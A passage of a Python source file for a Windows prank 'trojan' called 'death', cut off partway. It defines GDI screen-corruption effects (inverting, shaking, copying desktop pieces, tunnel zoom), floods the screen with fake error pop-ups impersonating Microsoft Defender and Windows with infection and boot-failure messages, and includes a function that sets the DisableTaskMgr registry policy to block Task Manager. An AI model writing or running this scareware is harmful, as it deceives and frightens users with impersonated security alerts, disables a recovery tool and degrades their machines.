# death

import tkinter as tk
import random
import subprocess
import winreg
import os
import json
import keyboard
import pygame
from PIL import Image, ImageTk
import winsound
import time
import ctypes
import threading
from ctypes import wintypes

##################
### Start Mode ###
##################
mode = "warning" #
##################
# Just put it to "warning".
##################
# warning = Yes or No (Disallow debug)
# warningdebug = Yes or No (Allow debug)
# nowarning = No warning
# debug = Debug mode
# delay = Delayed by 10 seconds

VALID_START_MODES = {"warning", "warningdebug", "nowarning", "debug", "delay"}
START_DELAY_MS = 10000

pygame.mixer.init()

# Tk setup
root = tk.Tk()
root.withdraw()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# theme paths
DWM_PATH = r"Software\Microsoft\Windows\DWM"
PERSONALIZE_PATH = r"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
EXPLORER_ACCENT_PATH = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Accent"

RED_COLORIZATION = 0xFFFF0000
RED_ACCENT = 0xFF0000FF
RED_ACCENT_PALETTE = bytes(
    channel
    for red, green, blue in (
        (0x4C, 0x00, 0x00),
        (0x66, 0x00, 0x00),
        (0x80, 0x00, 0x00),
        (0x99, 0x00, 0x00),
        (0xB3, 0x00, 0x00),
        (0xCC, 0x00, 0x00),
        (0xE6, 0x00, 0x00),
        (0xFF, 0x00, 0x00),
    )
    for channel in (blue, green, red, 0xFF)
)

_saved_theme = None

# Main settings
window_width, window_height = 340, 120

MAX_ERROR_WINDOWS = 1400  # Soft cap so death does not bog down the PC.

last_beep_time = 0
stage = 1  # Current stage, from 1 to 15.
running = True
start_time = None
finale_started = False

# Pieces timings by stage
PIECES_TIMER_SETTINGS = {
    3: 5000,
    4: 3000,
    5: 1000,
    6: 600,
    7: 400,
    8: 200,
    9: 50,
    10: 5,
    11: 5000,
    12: 7500,
    13: 200,
    14: 400,
    15: 1
}

# Timing maps
ERROR_WINDOW_SPAWN_INTERVALS = {
    1: 9000,
    2: 4200,
    3: 3300,
    4: 2400,
    5: 2000,
    6: 1500,
    7: 1000,
    8: 7000,
    9: 9000,
    10: 6000,
    11: 5000,
    12: 1,
    13: 999999,
    14: 999999,
    15: 999999,
}

ERROR_WINDOW_LIFETIMES = {
    1: 10000,
    2: 10000,
    3: 9000,
    4: 8000,
    5: 7000,
    6: 6000,
    7: 5000,
    8: 3500,
    9: 3000,
    10: 2500,
    11: 2000,
    12: 1500,
    13: 10000,
    14: 1000,
    15: 1000,
}

ERROR_SOUND_INTERVALS = {
    1: 3000,
    2: 1700,
    3: 800,
    4: 250,
    5: 100,
    6: 50,
    7: 25,
    8: 10,
    9: 10,
    10: 30,
    11: 50,
    12: 60,
    13: 70,
    14: 50,
    15: 70,
}

ERROR_ICON_SPAWN_INTERVALS = {
    1: 5000,
    2: 3000,
    3: 2000,
    4: 1000,
    5: 600,
    6: 300,
    7: 50,
    8: 1234,
    9: 1234,
    10: 1234,
    11: 1234,
    12: 1234,
    13: 1234,
    14: 1234,
    15: 1234,
}

ERROR_ICON_LIFETIMES = {
    1: 1000,
    2: 5000,
    3: 10000,
    4: 15000,
    5: 2000,
    6: 4333,
    7: 1000,
    8: 1000,
    9: 30000,
    10: 15000,
    11: 15000,
    12: 18000,
    13: 20000,
    14: 25000,
    15: 30000,
}

TUNNEL_EFFECT_INTERVALS = {5: 3.0, 6: 2.0, 7: 1.0, 8: 0.5, 9: 0.2, 10: 0.001, 11: 0.2, 12: 0.2, 13: 0.001, 14: 0.001, 15: 0.001}
INVERT_INTERVALS = {
    4: 5000,
    5: 3000,
    6: 2000,
    7: 1200,
    8: 800,
    9: 400,
    10: 200,
    11: 200,
    12: 100,
    13: 50,
    14: 30,
    15: 1,
}
DRAWICON_INTERVALS = {
    5: 1000,
    6: 700,
    7: 400,
    8: 30,
    9: 30,
    10: 30,
    11: 30,
    12: 30,
    13: 30,
    14: 30,
    15: 1,
}
SHAKER_INTENSITIES = {
    3: 0.10,
    4: 0.18,
    5: 0.28,
    6: 0.40,
    7: 0.55,
    8: 0.75,
    9: 0.86,
    10: 1.00,
    11: 1.00,
    12: 1.00,
    13: 1.00,
    14: 1.00,
    15: 1.00
}
FLOATING_ICON_DISABLED_STAGES = {8, 9, 10, 11, 12, 13, 14, 15}
debug_window = None
tunnel_active = False
drawicon_active = False
invert_active = False
shaker_active = False
debug_force_floating_icons = False
red_theme_active = False


# Win32 desktop effects
SRCCOPY = 0x00CC0020
NOTSRCCOPY = 0x00330008
SM_CXICON = 11
SM_CYICON = 12
SM_CXSCREEN = 0
SM_CYSCREEN = 1
IDI_ERROR = 32513
IDI_WARNING = 32515
IDI_INFORMATION = 32516
BI_RGB = 0
DIB_RGB_COLORS = 0
DI_NORMAL = 0x0003

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

GetDesktopWindow = user32.GetDesktopWindow
GetWindowDC = user32.GetWindowDC
ReleaseDC = user32.ReleaseDC
GetWindowRect = user32.GetWindowRect
StretchBlt = gdi32.StretchBlt
BitBlt = gdi32.BitBlt
DrawIconEx = user32.DrawIconEx
LoadIconW = user32.LoadIconW
CreateCompatibleDC = gdi32.CreateCompatibleDC
CreateCompatibleBitmap = gdi32.CreateCompatibleBitmap
CreateDIBSection = gdi32.CreateDIBSection
SelectObject = gdi32.SelectObject
DeleteObject = gdi32.DeleteObject
DeleteDC = gdi32.DeleteDC

GetDesktopWindow.restype = wintypes.HWND
GetWindowDC.argtypes = [wintypes.HWND]
GetWindowDC.restype = wintypes.HDC
ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
GetWindowRect.argtypes = [wintypes.HWND, ctypes.c_void_p]
BitBlt.argtypes = [
    wintypes.HDC,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    wintypes.HDC,
    ctypes.c_int,
    ctypes.c_int,
    wintypes.DWORD,
]
StretchBlt.argtypes = [
    wintypes.HDC,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    wintypes.HDC,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_int,
    wintypes.DWORD,
]
CreateCompatibleDC.argtypes = [wintypes.HDC]
CreateCompatibleDC.restype = wintypes.HDC
CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
CreateCompatibleBitmap.restype = wintypes.HBITMAP
CreateDIBSection.argtypes = [
    wintypes.HDC,
    ctypes.c_void_p,
    ctypes.c_uint,
    ctypes.POINTER(ctypes.c_void_p),
    wintypes.HANDLE,
    wintypes.DWORD,
]
CreateDIBSection.restype = wintypes.HBITMAP
SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
SelectObject.restype = wintypes.HGDIOBJ
DeleteObject.argtypes = [wintypes.HGDIOBJ]
DeleteDC.argtypes = [wintypes.HDC]
LoadIconW.argtypes = [wintypes.HINSTANCE, wintypes.LPCWSTR]
LoadIconW.restype = ctypes.c_void_p
DrawIconEx.argtypes = [
    wintypes.HDC,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_void_p,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_uint,
    ctypes.c_void_p,
    ctypes.c_uint,
]
DrawIconEx.restype = wintypes.BOOL


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


class POINT(ctypes.Structure):
    _fields_ = [("x", wintypes.LONG), ("y", wintypes.LONG)]


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", wintypes.DWORD),
        ("biWidth", wintypes.LONG),
        ("biHeight", wintypes.LONG),
        ("biPlanes", wintypes.WORD),
        ("biBitCount", wintypes.WORD),
        ("biCompression", wintypes.DWORD),
        ("biSizeImage", wintypes.DWORD),
        ("biXPelsPerMeter", wintypes.LONG),
        ("biYPelsPerMeter", wintypes.LONG),
        ("biClrUsed", wintypes.DWORD),
        ("biClrImportant", wintypes.DWORD),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", wintypes.DWORD * 3),
    ]


def _make_resource_id(res_id):
    return ctypes.cast(ctypes.c_void_p(res_id), wintypes.LPCWSTR)


def load_system_icon(res_id, size=(32, 32)):
    width, height = size
    hicon = LoadIconW(None, _make_resource_id(res_id))
    if not hicon:
        raise OSError(f"Could not load system icon {res_id}")

    screen_hdc = GetWindowDC(None)
    memdc = CreateCompatibleDC(screen_hdc)
    bits = ctypes.c_void_p()
    bitmap_info = BITMAPINFO()
    bitmap_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bitmap_info.bmiHeader.biWidth = width
    bitmap_info.bmiHeader.biHeight = -height
    bitmap_info.bmiHeader.biPlanes = 1
    bitmap_info.bmiHeader.biBitCount = 32
    bitmap_info.bmiHeader.biCompression = BI_RGB

    bitmap = CreateDIBSection(
        memdc,
        ctypes.byref(bitmap_info),
        DIB_RGB_COLORS,
        ctypes.byref(bits),
        None,
        0,
    )
    old_object = SelectObject(memdc, bitmap)
    try:
        DrawIconEx(memdc, 0, 0, hicon, width, height, 0, None, DI_NORMAL)
        raw = ctypes.string_at(bits, width * height * 4)
        return Image.frombuffer("RGBA", size, raw, "raw", "BGRA", 0, 1).copy()
    finally:
        SelectObject(memdc, old_object)
        DeleteObject(bitmap)
        DeleteDC(memdc)
        ReleaseDC(None, screen_hdc)


def _normalize_interval_ms(timer_ms):
    return max(1, int(timer_ms))


def _get_desktop_rect():
    hwnd = GetDesktopWindow()
    rect = RECT()
    GetWindowRect(hwnd, ctypes.byref(rect))
    return hwnd, rect


class ScreenBitmapBackup:
    """Stores and restores one snapshot of the desktop."""

    def __init__(self):
        self.bitmap = None

    def capture(self):
        self.delete()
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)
        memdc = CreateCompatibleDC(hdc)
        old_object = None
        try:
            rect = RECT()
            GetWindowRect(hwnd, ctypes.byref(rect))
            width = rect.right - rect.left
            height = rect.bottom - rect.top
            self.bitmap = CreateCompatibleBitmap(hdc, width, height)
            old_object = SelectObject(memdc, self.bitmap)
            BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY)
        finally:
            if old_object:
                SelectObject(memdc, old_object)
            DeleteDC(memdc)
            ReleaseDC(hwnd, hdc)

    def restore(self):
        if not self.bitmap:
            return

        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)
        memdc = CreateCompatibleDC(hdc)
        old_object = None
        try:
            rect = RECT()
            GetWindowRect(hwnd, ctypes.byref(rect))
            width = rect.right - rect.left
            height = rect.bottom - rect.top
            old_object = SelectObject(memdc, self.bitmap)
            BitBlt(hdc, 0, 0, width, height, memdc, 0, 0, SRCCOPY)
        finally:
            if old_object:
                SelectObject(memdc, old_object)
            DeleteDC(memdc)
            ReleaseDC(hwnd, hdc)
            self.delete()

    def delete(self):
        if self.bitmap:
            DeleteObject(self.bitmap)
            self.bitmap = None


class PiecesEffect:
    """Copies random desktop rectangles around on a loop."""

    def __init__(self):
        self.running = False
        self.paused = False
        self.interval_ms = 5000
        self.thread = None
        self.backup = ScreenBitmapBackup()

    def start(self, timer_ms=5000):
        self.interval_ms = _normalize_interval_ms(timer_ms)
        if self.running:
            return

        self.backup.capture()
        self.running = True
        self.paused = False
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        hwnd, rect = _get_desktop_rect()
        hdc = GetWindowDC(hwnd)
        screen_width = rect.right - rect.left
        screen_height = rect.bottom - rect.top
        try:
            while self.running:
                if not self.paused:
                    x1 = random.randrange(max(1, screen_width - 100))
                    y1 = random.randrange(max(1, screen_height - 100))
                    x2 = random.randrange(max(1, screen_width - 100))
                    y2 = random.randrange(max(1, screen_height - 100))
                    width = max(50, random.randrange(600))
                    height = max(50, random.randrange(600))

                    if x1 + width > screen_width:
                        width = max(1, screen_width - x1)
                    if y1 + height > screen_height:
                        height = max(1, screen_height - y1)
                    if x2 + width > screen_width:
                        x2 = max(0, screen_width - width)
                    if y2 + height > screen_height:
                        y2 = max(0, screen_height - height)

                    BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY)

                self._sleep_until_next_frame()
        finally:
            ReleaseDC(hwnd, hdc)

    def _sleep_until_next_frame(self):
        remaining_ms = _normalize_interval_ms(self.interval_ms)
        while self.running and remaining_ms > 0:
            sleep_chunk_ms = min(remaining_ms, 10)
            time.sleep(sleep_chunk_ms / 1000.0)
            remaining_ms -= sleep_chunk_ms
            updated_interval = _normalize_interval_ms(self.interval_ms)
            if updated_interval < remaining_ms:
                remaining_ms = updated_interval

    def timer(self, timer_ms):
        self.interval_ms = _normalize_interval_ms(timer_ms)

    def is_running(self):
        return self.running

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False

    def stop(self):
        self.running = False
        self.paused = False
        if self.thread:
            self.thread.join(timeout=2.0)
        self.thread = None
        self.backup.restore()


class InvertEffect:
    """Inverts the desktop pixels on a loop."""

    def __init__(self):
        self.running = False
        self.interval_ms = 1000
        self.thread = None
        self.backup = ScreenBitmapBackup()

    def start(self, timer_ms=1000):
        self.interval_ms = _normalize_interval_ms(timer_ms)
        if self.running:
            return 100

        self.backup.capture()
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return 100

    def _loop(self):
        while self.running:
            hwnd, rect = _get_desktop_rect()
            hdc = GetWindowDC(hwnd)
            try:
                width = rect.right - rect.left
                height = rect.bottom - rect.top
                BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, NOTSRCCOPY)
            finally:
                ReleaseDC(hwnd, hdc)

            self._sleep_until_next_frame()

    def _sleep_until_next_frame(self):
        remaining_ms = _normalize_interval_ms(self.interval_ms)
        while self.running and remaining_ms > 0:
            sleep_chunk_ms = min(remaining_ms, 10)
            time.sleep(sleep_chunk_ms / 1000.0)
            remaining_ms -= sleep_chunk_ms
            remaining_ms = min(remaining_ms, _normalize_interval_ms(self.interval_ms))

    def stop(self):
        if not self.running:
            return 100

        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        self.thread = None
        self.backup.restore()
        return 100

    def set_interval(self, timer_ms):
        self.interval_ms = _normalize_interval_ms(timer_ms)
        return 100


class TunnelEffect:
    """Runs the tunnel effect on a loop."""

    def __init__(self):
        self.running = False
        self.interval = 0.1
        self.thread = None
        self.times = 0

    def tunnel(self):
        try:
            hwnd = GetDesktopWindow()
            hdc = GetWindowDC(hwnd)
            rect = RECT()
            GetWindowRect(hwnd, ctypes.byref(rect))

            StretchBlt(
                hdc,
                50,
                50,
                rect.right - 100,
                rect.bottom - 100,
                hdc,
                0,
                0,
                rect.right,
                rect.bottom,
                SRCCOPY,
            )

            ReleaseDC(hwnd, hdc)
            return True
        except Exception as e:
            print(f"Tunnel effect error: {e}")
            return False

    def start(self, interval=0.1):
        if self.running:
            return
        self.interval = interval
        self.running = True
        self.times = 0
        self.thread = threading.Thread(target=self._tunnel_loop, daemon=True)
        self.thread.start()

    def _tunnel_loop(self):
        while self.running:
            self.tunnel()
            self.times += 1
            time.sleep(self.interval)

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        self.times = 0


class Shaker:
    """Runs a global screen shake effect on a loop."""

    def __init__(self):
        self.running = False
        self.thread = None
        self.interval = 1.0 / 60.0
        self.intensity = 0.0
        self.times = 0

    def shake(self):
        try:
            hwnd = GetDesktopWindow()
            hdc = GetWindowDC(hwnd)
            rect = RECT()
            GetWindowRect(hwnd, ctypes.byref(rect))

            strength = int(self.intensity * 30)
            x_offset = random.randint(-strength, strength)
            y_offset = random.randint(-strength, strength)

            BitBlt(
                hdc,
                x_offset,
                y_offset,
                rect.right,
                rect.bottom,
                hdc,
                0,
                0,
                SRCCOPY,
            )

            ReleaseDC(hwnd, hdc)
            self.times += 1
            return True
        except Exception as e:
            print(f"Shaker error: {e}")
            return False

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        while self.running:
            start = time.time()
            self.shake()
            sleep_time = self.interval - (time.time() - start)
            if sleep_time > 0:
                time.sleep(sleep_time)

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        self.times = 0

    def set_intensity(self, value):
        self.intensity = max(0, min(1, value))


class DrawIconEffect:
    def __init__(self):
        self.running = False
        self.thread = None
        self.stop_event = threading.Event()
        self.interval = 5.0
        self.times = 0

    def draw_once(self):
        ix = user32.GetSystemMetrics(SM_CXICON) // 2
        iy = user32.GetSystemMetrics(SM_CYICON) // 2
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)
        try:
            cursor = POINT()
            if user32.GetCursorPos(ctypes.byref(cursor)) == 0:
                return

            error_icon = LoadIconW(None, _make_resource_id(IDI_ERROR))
            warning_icon = LoadIconW(None, _make_resource_id(IDI_WARNING))

            DrawIconEx(hdc, cursor.x - ix, cursor.y - iy, error_icon, 0, 0, 0, None, DI_NORMAL)

            screen_width = user32.GetSystemMetrics(SM_CXSCREEN)
            screen_height = user32.GetSystemMetrics(SM_CYSCREEN)
            threshold = int(10 / (self.times / 500.0 + 1) + 1)
            threshold = max(1, threshold)

            if random.randrange(threshold) == 0:
                x = random.randrange(max(1, screen_width))
                y = random.randrange(max(1, screen_height))
                DrawIconEx(hdc, x, y, warning_icon, 0, 0, 0, None, DI_NORMAL)
        finally:
            ReleaseDC(hwnd, hdc)

    def _loop(self):
        while not self.stop_event.wait(self.interval):
            self.times += 1
            self.draw_once()

    def set_interval(self, interval_ms):
        self.interval = max(interval_ms / 1000.0, 0.01)

    def start(self, interval_ms=5000):
        if self.running:
            self.set_interval(interval_ms)
            return
        self.set_interval(interval_ms)
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.running = True
        self.thread.start()

    def stop(self):
        if not self.running:
            return
        self.stop_event.set()
        if self.thread is not None:
            self.thread.join(timeout=2.0)
        self.running = False
        self.thread = None


pieces_effect = PiecesEffect()
invert_effect = InvertEffect()
tunnel_effect = TunnelEffect()
shaker_effect = Shaker()
drawicon_effect = DrawIconEffect()


def start_pieces(timer_ms=5000):
    pieces_effect.start(timer_ms)


def stop_pieces():
    pieces_effect.stop()


def is_pieces_running():
    return pieces_effect.is_running()


def set_pieces_timer(timer_ms):
    pieces_effect.timer(timer_ms)


def start_invert(timer_ms=1000):
    return invert_effect.start(timer_ms)


def stop_invert():
    return invert_effect.stop()


def set_invert_interval(timer_ms):
    return invert_effect.set_interval(timer_ms)


def start_tunnel(interval=0.1):
    tunnel_effect.start(interval)


def stop_tunnel():
    tunnel_effect.stop()


def start_shaker():
    shaker_effect.start()


def stop_shaker():
    shaker_effect.stop()


def set_shaker_intensity(value):
    shaker_effect.set_intensity(value)


def start_drawicon(interval_ms=5000):
    drawicon_effect.start(interval_ms)


def stop_drawicon():
    drawicon_effect.stop()


# Assets
script_dir = os.path.dirname(os.path.abspath(__file__))
assets_dir = os.path.join(script_dir, "assets")
death_icon_path = os.path.join(assets_dir, "death.png")


def load_image_file(path, size=(32, 32)):
    if not os.path.exists(path):
        raise FileNotFoundError(f"Image file not found: {path}")
    image = Image.open(path)
    if size is not None:
        image = image.resize(size, Image.Resampling.LANCZOS)
    return image


loaded_icons = {
    "error": ImageTk.PhotoImage(load_system_icon(IDI_ERROR)),
    "warning": ImageTk.PhotoImage(load_system_icon(IDI_WARNING)),
    "info": ImageTk.PhotoImage(load_system_icon(IDI_INFORMATION)),
    "death": ImageTk.PhotoImage(load_image_file(death_icon_path)),
}

cursor_img = load_system_icon(IDI_ERROR)
cursor_icon_photo = ImageTk.PhotoImage(cursor_img)

errors_list = [["Microsoft Defender Antivirus", "Trojan:Win32.death!ml detected.", "warning"],["Microsoft Defender Antivirus [Severe]", "Trojan:Win32.death!ml could not be remediated", "error"],["Microsoft Defender Antivirus [Severe]", "Trojan:Win32.death!ml is active.", "warning"],["Microsoft Defender Antivirus [Deadly]", "death.exe has been detected", "warning"],["Microsoft Defender Antivirus", "This PC is infected with death", "warning"],["Microsoft Defender Antivirus", "Death trojan is active.", "warning"],["Microsoft Defender Antivirus [Deadly warning]", "The computer will not boot.", "warning"],["Microsoft Defender Antivirus", "Privllege escalation @ death.exe", "warning"],["Microsoft Defender Antivirus", "Critical system files compromised.", "warning"],["Microsoft Defender Antivirus", "Death trojan is spreading.", "warning"],["Microsoft Defender Antivirus", "Unauthorized access detected.", "warning"],["Microsoft Defender Antivirus", "System integrity compromised.", "warning"],["Microsoft Defender Antivirus", "Death trojan is damaging system files", "warning"],["Microsoft Defender Antivirus", "System performance degraded by malware", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% CPU.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% RAM.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% disk.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% network.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% GPU.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% power.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% battery.", "warning"],["Microsoft Defender Antivirus", "Death trojan is using 666% fan.", "warning"],["Microsoft Defender Antivirus", "Death trojan has caued 666 degrees CPU temperature.", "warning"],["Microsoft Defender Antivirus", "Death trojan has caued 666 degrees GPU temperature.", "warning"],["Microsoft Windows", "Failed to launch process svchost.exe", "error"],["Microsoft Windows", "Failed to maintain system integrity", "error"],["Microsoft Windows", "Failed to load system files", "error"],["Microsoft Windows", "Failed to load driver files", "error"],["Microsoft Windows", "Failed to load configuration files", "error"],["Microsoft Windows", "Failed to verify activation key", "error"],["Microsoft Windows", "System32 was not found", "error"],["Microsoft Windows", "Failed to get System32; got 'death.exe'", "error"],["Microsoft Windows", "Failed to run Windows Boot Manager", "error"],["Microsoft Windows", "Windows Boot Manager failed to initialize", "error"],["Microsoft Windows", "Error occured while updating Microsoft Defender Antivirus", "error"],["Microsoft Windows", "Antivirus software not found. Please install it.", "warning"],["Microsoft Windows", "Windows is infected with death", "warning"],["Microsoft Windows", "Your PC is infected with death", "warning"],["Microsoft Windows", "System files are compromised.", "warning"]]
errors = [tuple(item) for item in errors_list]

all_windows = []

# Sounds
sound_folder = assets_dir
sound_files = [os.path.join(sound_folder, f"error ({i}).wav") for i in range(1, 9)]
sounds = [pygame.mixer.Sound(f) for f in sound_files]


def _read_dword(path, name, default=0):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
            value, _ = winreg.QueryValueEx(key, name)
            return int(value)
    except FileNotFoundError:
        return default


def _read_value(path, name):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
            return winreg.QueryValueEx(key, name)
    except FileNotFoundError:
        return None, None


def _write_dword(path, name, value):
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, int(value))


def _write_binary(path, name, value):
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_BINARY, value)


def _write_saved_value(path, name, saved):
    value, value_type = saved
    if value_type is None:
        return
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as key:
        winreg.SetValueEx(key, name, 0, value_type, value)



POLICIES_SYSTEM_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
def disable_task_manager():
    _write_dword(POLICIES_SYSTEM_PATH, "DisableTaskMgr", 1)
def enable_task_manager():
    _write_dword(POLICIES_SYSTEM_PATH, "DisableTaskMgr", 0)


import sys

def hide_cursor():
    """Hide the terminal cursor."""
    if sys.platform.startswith("win"):
        # Windows fallback
        import ctypes
        ci = ctypes.windll.kernel32
        handle = ci.GetStdHandle(-11)  # STD_OUTPUT_HANDLE = -11

        class CONSOLE_CURSOR_INFO(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_int),
                        ("bVisible", ctypes.c_bool)]

        cursor_info = CONSOLE_CURSOR_INFO()
        ci.GetConsoleCursorInfo(handle, ctypes.byref(cursor_info))
        cursor_info.bVisible = False
        ci.SetConsoleCursorInfo(handle, ctypes.byref(cursor_info))
    else:
        # ANSI escape sequence (Linux/macOS/modern Windows Terminal)
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()


def show_cursor():
    """Show the terminal cursor."""
    if sys.platform.startswith("win"):
        import ctypes
        ci = ctypes.windll.kernel32
        handle = ci.GetStdHandle(-11)

        class CONSOLE_CURSOR_INFO(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_int),
                        ("bVisible", ctypes.c_bool)]

        cursor_info = CONSOLE_CURSOR_INFO()
        ci.GetConsoleCursorInfo(handle, ctypes.byref(cursor_info))
        cursor_info.bVisible = True
        ci.SetConsoleCursorInfo(handle, ctypes.byref(cursor_info))
    else:
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()


def play_error_sound_loop():
    if not running:
        return
    sound = random.choice(sounds)
    channel = pygame.mixer.find_channel()
    if channel:
        channel.play(sound)
    else:
        sound.play()
    interval = ERROR_SOUND_INTERVALS[stage]
    root.after(interval, play_error_sound_loop)

# Colors
bg_colors = ["#1F1F1F","#0F0F0F","#363636","#5C5C5C","#CFCFCF","#ADADAD",
             "#7D7D7D","#565687","#4D4D94","#323266","#613333","#542323"]
title_colors = ["#4840DE","#251F94","#18127A","#211F47","#661212","#3864CF","#2A498C"]

# Fullscreen overlay for floating icons.
class IconOverlay:
    def __init__(self):
        self.root = None
        self.canvas = None
        self.running = False
        self.start()

    def start(self):
        """Create the fullscreen overlay when the effect is enabled."""
        if self.running:
            return

        self.root = tk.Toplevel()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.attributes('-alpha', 1.0)

        # Make the overlay click-through.
        self.root.update_idletasks()
        hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
        GWL_EXSTYLE = -20
        WS_EX_LAYERED = 0x80000
        WS_EX_TRANSPARENT = 0x20
        WS_EX_NOACTIVATE = 0x08000000
        WS_EX_TOOLWINDOW = 0x00000080
        styles = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
        ctypes.windll.user32.SetWindowLongW(
            hwnd,
            GWL_EXSTYLE,
            styles | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW
        )

        # Treat black as transparent.
        ctypes.windll.user32.SetLayeredWindowAttributes(
            hwnd, 0x000000, 0, 0x00000001
        )

        # This canvas holds the icons.
        self.canvas = tk.Canvas(self.root, width=screen_width, height=screen_height,
                                bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        self.running = True

    def stop(self):
        """Close the icon overlay."""
        if self.running:
            try:
                self.root.destroy()
            except Exception:
                pass
            self.root = None
            self.canvas = None
            self.running = False

icon_overlay = IconOverlay()
floating_icon_after_id = None

# Spawn one fake error window.
def create_error():
    global last_beep_time, start_time
    if not running:
        return

    title, message, icon_type = random.choice(errors)

    width_offset = random.randint(0, 15)
    height_offset = random.randint(0, 15)
    w = window_width + width_offset
    h = window_height + height_offset

    x = random.randint(0, screen_width - w)
    y = random.randint(0, screen_height - h)

    win = tk.Toplevel()
    win.overrideredirect(True)
    win.attributes("-topmost", True)

    bg_color = random.choice(bg_colors)
    title_color = random.choice(title_colors)

    # Title bar
    title_bar = tk.Frame(win, bg=title_color, relief="raised", bd=0, height=24)
    title_bar.pack(fill="x")
    title_label = tk.Label(title_bar, text=title, bg=title_color, fg="white", font=("Segoe UI", 10, "bold"))
    title_label.pack(side="left", padx=5)

    def start_move(event):
        win.x = event.x
        win.y = event.y
    def do_move(event):
        win.geometry(f"+{event.x_root - win.x}+{event.y_root - win.y}")
    title_bar.bind("<Button-1>", start_move)
    title_bar.bind("<B1-Motion>", do_move)

    # Body
    content_frame = tk.Frame(win, bg=bg_color)
    content_frame.pack(fill="both", expand=True)

    canvas_bg = tk.Canvas(content_frame, width=w, height=h-24, bg=bg_color, highlightthickness=0)
    canvas_bg.pack(fill="both", expand=True)

    for i in range(5):
        alpha = int(255*(0.05*(5-i)))
        shadow_color = f"#{alpha:02x}{alpha:02x}{alpha:02x}"
        canvas_bg.create_rectangle(i, i, w-i, h-24-i, outline=shadow_color)

    icon_label = tk.Label(canvas_bg, image=loaded_icons[icon_type], bg=bg_color)
    canvas_bg.create_window(20, 20, anchor="nw", window=icon_label)
    msg_label = tk.Label(canvas_bg, text=message, bg=bg_color,
                         fg="white" if bg_color not in ["#CFCFCF","#ADADAD"] else "black",
                         anchor="nw", justify="left", wraplength=w-80)
    canvas_bg.create_window(60, 20, anchor="nw", window=msg_label)

    # Button
    btn_bg = "#2A2A2A"
    btn_fg = "white"
    btn_active_bg = "#4840DE"
    btn_active_fg = "white"
    btn_border = "#484848"

    btn = tk.Button(
        canvas_bg,
        text="OK",
        width=8,
        font=("Segoe UI", 9, "bold"),
        bg=btn_bg,
        fg=btn_fg,
        activebackground=btn_active_bg,
        activeforeground=btn_active_fg,
        bd=2,
        relief="solid",
        highlightbackground=btn_border,
        highlightcolor=btn_border,
        cursor="hand2",
        command=lambda: remove_window_immediately(win)
    )

    canvas_bg.create_window(w-80, h-60, anchor="nw", window=btn)

    # Spawn at full size.
    win.geometry(f"{w}x{h}+{x}+{y}")

    now = time.time()
    if now - last_beep_time > 0.1:
        winsound.MessageBeep(winsound.MB_ICONHAND)
        last_beep_time = now

    all_windows.append(win)
    win.protocol("WM_DELETE_WINDOW", lambda w=win: remove_window_immediately(w))
